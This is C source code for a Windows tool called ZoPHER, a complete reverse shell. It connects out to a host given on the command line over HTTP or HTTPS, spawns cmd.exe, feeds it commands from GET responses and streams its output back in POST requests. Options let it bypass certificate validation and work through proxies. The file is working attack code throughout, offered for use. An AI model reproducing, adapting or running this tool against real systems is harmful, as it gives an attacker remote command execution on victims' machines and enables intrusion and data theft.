/**
 * Copyright 2013 @cmpxchg8
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
 * MA  02111-1307 USA
 *
 * http://www.gnu.org/licenses/gpl-2.0.txt
 *
 */

#define APP_NAME     "ZoPHER"
#define APP_VERSION  "0.1b"
#define AUTHOR_EMAIL "@cmpxchg8"

#define _CRT_SECURE_NO_WARNINGS

#define MAX_CONNECTION    2
#define HTTP_PORT        80
#define HTTPS_PORT      443

// in seconds
#define DEFAULT_TIMEOUT 10  // 10 seconds
#define RECEIVE_TIMEOUT 600 // 10 minutes

#pragma comment(lib, "wininet.lib")

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <string.h>

#include <ws2tcpip.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>

// callback context
#define CONNECTION_CONTEXT 1
#define GET_CONTEXT        2
#define POST_CONTEXT       3

const char *lpszRequest[] = { "GET", "POST" };
DWORD dwContext[] = { GET_CONTEXT, POST_CONTEXT };

// ==================================================

#define MAX_EVENTS 9

int verbose=0, proxy=0, retries=1;
int interrupt=0, connected=0, timeout=DEFAULT_TIMEOUT*1000;
char *agent=APP_NAME;

// global variables
DWORD dwError, hIndex=0;
LPVOID ih[4];

// handles
#define WININET_INTERNET_HANDLE     0
#define WININET_CONNECTION_HANDLE   1
#define WININET_GET_REQUEST_HANDLE  2
#define WININET_POST_REQUEST_HANDLE 3

// ==================================================

// global variables
HANDLE ge[MAX_EVENTS];

// event index
#define WININET_HANDLE_CREATED         0
#define WININET_CONNECTION_ESTABLISHED 1
#define WININET_CONNECTION_CLOSING     2
#define WININET_GET_REQUEST_COMPLETE   3
#define WININET_POST_REQUEST_COMPLETE  4
#define WININET_POST_REQUEST_SENT      5

#define STDOUT_DATA_AVAILABLE          6
#define PROCESS_CLOSED                 7
#define PROCESS_INTERRUPTED            8

const char *lpszEvents[] = { "Created", "Connection", "Closing", 
  "Get",  "Post",      "Sent", "StdOut" };
  
const char *lpszStatus[] = { "Created", "Connection", "Get",     
  "Post", "Post Sent", "StdOut" };

typedef struct _CallBackStatus {
  DWORD dwStatus;
  const char *text;
}CallBackStatus;

CallBackStatus pStatus[] =
{
  { INTERNET_STATUS_RESOLVING_NAME,        "Resolving Name"        },
  { INTERNET_STATUS_NAME_RESOLVED,         "Name resolve"          },
  { INTERNET_STATUS_CONNECTING_TO_SERVER,  "Connecting to server"  },
  { INTERNET_STATUS_CONNECTED_TO_SERVER,   "Connected"             },
  { INTERNET_STATUS_SENDING_REQUEST,       "Sending Request"       },
  { INTERNET_STATUS_REQUEST_SENT,          "Request sent"          },
  { INTERNET_STATUS_RECEIVING_RESPONSE,    "Receiving response"    },
  { INTERNET_STATUS_RESPONSE_RECEIVED,     "Response received"     },
  { INTERNET_STATUS_CTL_RESPONSE_RECEIVED, "CTL Response received" },
  { INTERNET_STATUS_PREFETCH,              "Prefetch"              },
  { INTERNET_STATUS_CLOSING_CONNECTION,    "Closing connection"    },
  { INTERNET_STATUS_CONNECTION_CLOSED,     "Connection closed"     },
  { INTERNET_STATUS_HANDLE_CREATED,        "Handle created"        },
  { INTERNET_STATUS_HANDLE_CLOSING,        "Handle closed"         },
  { INTERNET_STATUS_DETECTING_PROXY,       "Detecting proxy"       },
  { INTERNET_STATUS_REQUEST_COMPLETE,      "Request Complete"      },
  { INTERNET_STATUS_REDIRECT,              "Redirect"              },
  { INTERNET_STATUS_INTERMEDIATE_RESPONSE, "Intermediate response" },
  { INTERNET_STATUS_USER_INPUT_REQUIRED,   "User input required"   },
  { INTERNET_STATUS_STATE_CHANGE,          "State change"          },
  { INTERNET_STATUS_COOKIE_SENT,           "Cookie sent"           },
  { INTERNET_STATUS_COOKIE_RECEIVED,       "Cookie received"       },
  { INTERNET_STATUS_PRIVACY_IMPACTED,      "Privacy Impacted"      },
  { INTERNET_STATUS_P3P_HEADER,            "P3P Header"            },
  { INTERNET_STATUS_P3P_POLICYREF,         "P3P Policy Ref"        },
  { INTERNET_STATUS_COOKIE_HISTORY,        "Cookie History"        },
};

const char *GetStatus(DWORD dwStatus) {
  const char *status = "unknown";
  int  i;

  for (i = 0; i < sizeof(pStatus) / sizeof (CallBackStatus); i++)
  {
    if (pStatus[i].dwStatus == dwStatus)
    {
      status = pStatus[i].text;
      break;
    }
  }
  return status;
}

#define WDEBUG vout

void vout (const char fmt[], ...) {
  va_list arglist;
  char    buffer[2048];

  if (verbose == 0) return;

  va_start (arglist, fmt);
  vsnprintf (buffer, sizeof(buffer) - 1, fmt, arglist);
  va_end (arglist);

  fprintf (stdout, "\n  [*] %s", buffer);
}

void showError (void) {
  char *error=NULL;

  FormatMessage (FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
      NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
      (LPSTR)&error, 0, NULL);

  if (error != NULL) {
    fprintf (stdout, "%s", error);
    LocalFree (error);
  }
}

/**
 *
 *  All WinInet events get sent here
 *
 */
void WINAPI Callback (HINTERNET hInternet, DWORD dwContext,
  DWORD dwInternetStatus, LPVOID lpStatusInfo, DWORD dwStatusInfoLen)
{
  DWORD e = -1;

  WDEBUG ("In Callback for %s with %s",
      lpszStatus[dwContext], GetStatus(dwInternetStatus));

  if (dwInternetStatus == INTERNET_STATUS_HANDLE_CREATED) {
    INTERNET_ASYNC_RESULT *pRes = (INTERNET_ASYNC_RESULT *)lpStatusInfo;
    ih[++hIndex] = (HINTERNET)pRes->dwResult;
    e = WININET_HANDLE_CREATED;

  } else if (dwInternetStatus == INTERNET_STATUS_CONNECTED_TO_SERVER) {
    e = WININET_CONNECTION_ESTABLISHED;

  } else if (dwInternetStatus == INTERNET_STATUS_REQUEST_COMPLETE) {
    e = (dwContext == POST_CONTEXT) ?
      WININET_POST_REQUEST_COMPLETE : WININET_GET_REQUEST_COMPLETE;

  } else if (dwInternetStatus == INTERNET_STATUS_REQUEST_SENT) {
    e = (dwContext == POST_CONTEXT) ? WININET_POST_REQUEST_SENT : -1;

  } else if (dwInternetStatus == INTERNET_STATUS_CLOSING_CONNECTION) {
    e = WININET_CONNECTION_CLOSING;

  }
  if (e != -1) {
    SetEvent(ge[e]);
  }
}

/**
 *
 *  Creates cmd.exe with the following parameters:
 *
 *      GET request (inbound) written to hStdInput
 *      POST request (outbound) read from hStdOutput and hStdError
 *
 */
void SpawnCmd (void) {
  SECURITY_ATTRIBUTES sa;
  PROCESS_INFORMATION pi;
  STARTUPINFO         si;
  OVERLAPPED          lap;
  INTERNET_BUFFERS    ib;

  BYTE                in[BUFSIZ], out[BUFSIZ];
  HANDLE              lh[4];
  DWORD               rp, rn, wp, wn, i;

  WDEBUG ("Creating anonymous pipe for hStdInput");

  sa.nLength              = sizeof (SECURITY_ATTRIBUTES);
  sa.lpSecurityDescriptor = NULL;
  sa.bInheritHandle       = TRUE;

  if (CreatePipe (&lh[0], &lh[1], &sa, 0))
  {
    WDEBUG ("Creating named pipe for hStdOutput and hStdError");

    lh[2] = CreateNamedPipe ("\\\\.\\pipe\\1",
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE     | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES, 0, 0, 0, NULL);

    if (lh[2] != INVALID_HANDLE_VALUE)
    {
      WDEBUG ("Opening named pipe for hStdOutput and hStdError");

      lh[3] = CreateFile ("\\\\.\\pipe\\1", MAXIMUM_ALLOWED,
          0, &sa, OPEN_EXISTING, 0, NULL);

      if (lh[3] != INVALID_HANDLE_VALUE)
      {
        ZeroMemory (&si, sizeof (si));
        ZeroMemory (&pi, sizeof (pi));

        si.cb         = sizeof (si);
        si.hStdInput  = lh[0];
        si.hStdError  = lh[3];
        si.hStdOutput = lh[3];
        si.dwFlags    = STARTF_USESTDHANDLES;

        WDEBUG ("Creating cmd process");

        if (CreateProcess (NULL, "cmd", NULL, NULL, TRUE,
            0, NULL, NULL, &si, &pi))
        {
          ge[PROCESS_CLOSED] = pi.hProcess;

          ZeroMemory (&lap, sizeof (lap));
          lap.hEvent = ge[STDOUT_DATA_AVAILABLE];

          rp = 0;
          wp = 0;

          while (1)
          {
            // put request into "receiving response" status
            if (rp == 0)
            {
              ib.dwStructSize   = sizeof (INTERNET_BUFFERS);
              ib.lpvBuffer      = in;
              ib.dwBufferLength = BUFSIZ;

              WDEBUG ("InternetReadFileEx");
              if (!InternetReadFileEx (ih[WININET_GET_REQUEST_HANDLE],
                  &ib, WININET_API_FLAG_ASYNC, GET_CONTEXT))
              {
                if (GetLastError() != ERROR_IO_PENDING)
                {
                  WDEBUG ("InternetReadFileEx failed");
                  break;
                }
              }
              rp++;  // don't read anymore until this one completes
            }

            // now wait for event
            WDEBUG ("Waiting for events");

            i = WaitForMultipleObjects (MAX_EVENTS, ge,
                FALSE, INFINITE) - WAIT_OBJECT_0;

            WDEBUG ("Received event %s", lpszEvents[i]);

            // is this a command from the remote server?
            if (i == WININET_GET_REQUEST_COMPLETE)
            {
              WDEBUG ("Writing to hStdInput");
              WriteFile (lh[1], in, ib.dwBufferLength, &wn, 0);
              WDEBUG ("Decrementing Read Pending Flag");
              rp--;  // we're ready to read again.
            } else
            
            // data from hStdOutput or hStdError
            if (i == STDOUT_DATA_AVAILABLE)
            {
              // if write not pending, read it
              if (wp == 0)
              {
                WDEBUG ("Reading from hStdOutput");
                ZeroMemory (out, sizeof (out));
                ReadFile (lh[2], out, BUFSIZ, &rn, &lap);
                wp++;
                /*if (GetLastError() == ERROR_IO_PENDING) {
                  wp++;
                }*/
              } else {
                WDEBUG ("Getting overlapped result");

                if (!GetOverlappedResult (lh[2], &lap, &rn, FALSE)) {
                  WDEBUG ("GetOverlappedResult() failed");
                  break;
                }
              }
              if (rn != 0)
              {
                WDEBUG ("Sending %i bytes of data", rn);
                if (!InternetWriteFile (ih[WININET_POST_REQUEST_HANDLE],
                    out, rn, &wn))
                {
                  if (GetLastError() != ERROR_IO_PENDING)
                  {
                    WDEBUG ("InternetWriteFile failed with error %i", GetLastError());
                    break;
                  }
                }
                // Wait for the data to be sent before continuing.
                // I tried to put this along with WaitForMultipleObjects()
                // but it didn't work out..will need to test a bit more.
                WaitForSingleObject (ge[WININET_POST_REQUEST_SENT], INFINITE);
                wp--;
              }
            } else
            if (i == PROCESS_CLOSED)
            {
              WDEBUG ("cmd.exe closed");
              break;
            } else
            if (i == WININET_CONNECTION_CLOSING)
            {
              WDEBUG ("Connection closing");
              break;
            } else
            if (i == PROCESS_INTERRUPTED)
            {
              WDEBUG ("Process interrupted");
              break;
            }
          }
          TerminateProcess (pi.hProcess, 0);

          CloseHandle (pi.hThread);
          CloseHandle (pi.hProcess);
        }
        CloseHandle (lh[3]);
      }
      CloseHandle (lh[2]);
    }
    CloseHandle (lh[1]);
    CloseHandle (lh[0]);
  }
}

/**
 *
 *  establish a HTTP or HTTPS connection to remote server
 *
 *
 */
BOOL ReverseHttpCmd (char address[], DWORD dwFlags) {
  HANDLE           evt[3];
  INTERNET_BUFFERS ib;
  int              i, connections=0;
  DWORD            dwParam, dwEvent, dwSecurity, dwSize;

  ZeroMemory (&ih, sizeof (ih));
  hIndex = 0;

  for (i = 0; i < 7; i++)
  {
    WDEBUG ("Creating %s event", lpszEvents[i]);
    ge[i] = CreateEvent (NULL,
        (i==STDOUT_DATA_AVAILABLE),
        (i==STDOUT_DATA_AVAILABLE), NULL);
  }

  WDEBUG ("Opening internet handle");

  ih[WININET_INTERNET_HANDLE] = InternetOpen (agent,
      INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, INTERNET_FLAG_ASYNC);

  if (ih[WININET_INTERNET_HANDLE] != NULL)
  {
    WDEBUG ("Setting receive time out to %i seconds", RECEIVE_TIMEOUT);

    dwParam = RECEIVE_TIMEOUT * 1000;
    InternetSetOption (ih[WININET_INTERNET_HANDLE],
        INTERNET_OPTION_RECEIVE_TIMEOUT, &dwParam, sizeof (dwParam));

    WDEBUG ("Setting callback function");

    InternetSetStatusCallback (ih[WININET_INTERNET_HANDLE],
        (INTERNET_STATUS_CALLBACK)&Callback);

    WDEBUG ("Connecting to %s", address);

    InternetConnect (ih[WININET_INTERNET_HANDLE], address,
        (dwFlags & INTERNET_FLAG_SECURE) ?
        INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT,
        NULL, NULL, INTERNET_SERVICE_HTTP, 0, CONNECTION_CONTEXT);

    evt[0] = ge[WININET_HANDLE_CREATED];
    evt[1] = ge[PROCESS_INTERRUPTED];

    dwEvent = WaitForMultipleObjects (2, evt,
        FALSE, timeout) - WAIT_OBJECT_0;

    if (dwEvent == 0)
    {
      for (i = 0; i < MAX_CONNECTION; i++)
      {
        WDEBUG ("Opening %s request", lpszRequest[i]);

        HttpOpenRequest (ih[WININET_CONNECTION_HANDLE],
            lpszRequest[i], NULL, NULL, NULL, NULL, dwFlags, dwContext[i]);

        evt[0] = ge[WININET_HANDLE_CREATED];

        dwEvent = WaitForMultipleObjects (2, evt,
            FALSE, timeout) - WAIT_OBJECT_0;

        if (dwEvent != 0)
        {
          WDEBUG ("Waiting for handle creation failed.");
          break;
        }

        if (dwFlags & INTERNET_FLAG_IGNORE_CERT_CN_INVALID)
        {
          dwSize = sizeof (dwSecurity);
          dwSecurity = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                       SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                       SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                       SECURITY_FLAG_IGNORE_WRONG_USAGE       |
                       SECURITY_FLAG_IGNORE_REVOCATION;

          InternetSetOption (ih[WININET_GET_REQUEST_HANDLE + i],
              INTERNET_OPTION_SECURITY_FLAGS,
              &dwSecurity, sizeof(dwSecurity));
        }

        WDEBUG ("Sending %s request", lpszRequest[i]);

        if (i == 0)
        {
          HttpSendRequest (ih[WININET_GET_REQUEST_HANDLE],
              NULL, 0, NULL, dwContext[i]);
        } else {
          ZeroMemory (&ib, sizeof (ib));
          // for HTTP, some proxies will drop connection if Content-Length: 0
          if (proxy == 1)
          {
            ib.dwStructSize = sizeof (INTERNET_BUFFERS);
            ib.dwBufferTotal = -1;
          }
          HttpSendRequestEx (ih[WININET_POST_REQUEST_HANDLE],
              ib.dwBufferTotal == 0 ? 0 : &ib, 0, 0, dwContext[i]);
        }

        // The callback doesn't receive this event for SSL through proxy
        // Unsure if that's a bug or intended functionality ...
        if (proxy == 0)
        {
          evt[0] = ge[WININET_CONNECTION_ESTABLISHED];

          dwEvent = WaitForMultipleObjects (2, evt,
              FALSE, timeout) - WAIT_OBJECT_0;

          if (dwEvent != 0)
          {
            WDEBUG ("Waiting for Connection failed");
            break;
          }
        }
        WDEBUG ("Waiting for %s request to complete", lpszRequest[i]);

        evt[0] = ge[WININET_GET_REQUEST_COMPLETE];
        evt[2] = ge[WININET_POST_REQUEST_COMPLETE];

        dwEvent = WaitForMultipleObjects (3, evt,
            FALSE, timeout) - WAIT_OBJECT_0;

        if (dwEvent != 0 && dwEvent != 2)
        {
          WDEBUG ("Waiting for request to complete failed");
          break;
        }
        connections++;
      }
      if (connections == MAX_CONNECTION) {
        fprintf(stdout, "\n  [+] Connected");
        SpawnCmd ();
      }
      HttpEndRequest (ih[WININET_POST_REQUEST_HANDLE], NULL, 0, 0);

      InternetCloseHandle (ih[WININET_POST_REQUEST_HANDLE]);
      InternetCloseHandle (ih[WININET_GET_REQUEST_HANDLE]);
      InternetCloseHandle (ih[WININET_CONNECTION_HANDLE]);
    }
    WDEBUG ("Closing Internet Handle");

    InternetSetStatusCallback (ih[WININET_INTERNET_HANDLE], NULL);
    InternetCloseHandle (ih[WININET_INTERNET_HANDLE]);
  }

  for (i = 0; i < 7; i++)
  {
    WDEBUG ("Closing %s event", lpszEvents[i]);
    CloseHandle (ge[i]);
  }
  WDEBUG ("Exiting ReverseHttpCmd");
  return connections == MAX_CONNECTION;
}

// handle any logoff, shutdown or termination events external to this code
// for GUI, we would handle WM_QUERYENDSESSION
BOOL WINAPI HandlerRoutine(DWORD dwCtrlType) {
  SetEvent (ge[PROCESS_INTERRUPTED]);
  interrupt = 1;
  return TRUE;
}

void usage (char appname[]) {

  printf (
      "\n  Usage: %s <host> [options]\n"
      "\n  -s           Connect with SSL"
      "\n  -i           Ignore invalid SSL certificate or authority"
      "\n  -p           Use if behind proxy (sometimes helps)"
      "\n  -u <string>  User Agent in GET and POST requests (default is ZoPHER)"
      "\n  -t <seconds> Specify maximum timeout for events (default is 10 seconds)"
      "\n  -r <count>   Number of connection attempts (default is 1)"
      "\n  -v           Verbose output (useful for debugging)\n\n", appname);

  printf ("\n  Press any key to continue . . .");
  fgetc (stdin);
  exit (0);
}

int main (int argc, char *argv[]) {

  DWORD dwFlags;
  int   i;
  char  opt;
  char  *address=NULL;

  setbuf (stdout, NULL);
  setbuf (stderr, NULL);
  
  fprintf (stdout, "\n  ZoPHER Client Component v"APP_VERSION
          "\n  Copyright (c) 2013 "AUTHOR_EMAIL"\n");

  if (argc < 2) {
    usage (argv[0]);
  }

  // default flags for client
  dwFlags = INTERNET_FLAG_KEEP_CONNECTION |
            INTERNET_FLAG_NO_CACHE_WRITE  |
            INTERNET_FLAG_NO_UI           |
            INTERNET_FLAG_RELOAD          |
            INTERNET_FLAG_NO_AUTO_REDIRECT;

  for (i = 1; i < argc; i++) {
    if (argv[i][0] == '/' || argv[i][0] == '-') {
      opt = argv[i][1];
      switch (opt) {
        case 's' : {
          dwFlags |= INTERNET_FLAG_SECURE;
          break;
        }
        case 'i' : {
          dwFlags |= INTERNET_FLAG_IGNORE_CERT_CN_INVALID;
          dwFlags |= INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
          break;
        }
        case 'p' : {
          proxy = 1;
          break;
        }
        case 'r' : {
          if ((i + 1) <= argc) {
            retries = atoi (argv[++i]);
            break;
          }
          usage (argv[0]);
        }
        case 'u' : {
          if ((i + 1) <= argc) {
            agent = argv[++i];
            break;
          }
          usage (argv[0]);
        }
        case 't' : {
          if ((i + 1) <= argc) {
            timeout = atoi (argv[++i]);
            timeout *= 1000;
            break;
          }
          usage (argv[0]);
        }
        case 'v' : {
          verbose = 1;
          break;
        }
        case '?' :
        case 'h' :
          usage (argv[0]);
        default: {
          fprintf (stdout, "\n  Unknown option specified: %c\n", opt);
          usage (argv[0]);
        }
      }
    } else {
      address = argv[i];
    }
  }

  if (address == NULL) {
    usage (argv[0]);
  }

  ge[PROCESS_INTERRUPTED] = CreateEvent (NULL, FALSE, FALSE, NULL);

  if (SetConsoleCtrlHandler (HandlerRoutine, TRUE)) 
  {
    for (i = 0; i < retries && interrupt != 1; i++) 
    {
      fprintf (stdout, "\n\n  [+] Connecting to %s (attempt %i of %i)",
          address, (i+1), retries);

      if (ReverseHttpCmd (address, dwFlags)) break;
      
      fprintf (stdout, "\n  [-] Connection failed");
    }
    SetConsoleCtrlHandler (HandlerRoutine, FALSE);
  }
  CloseHandle (ge[PROCESS_INTERRUPTED]);
  return 0;
}
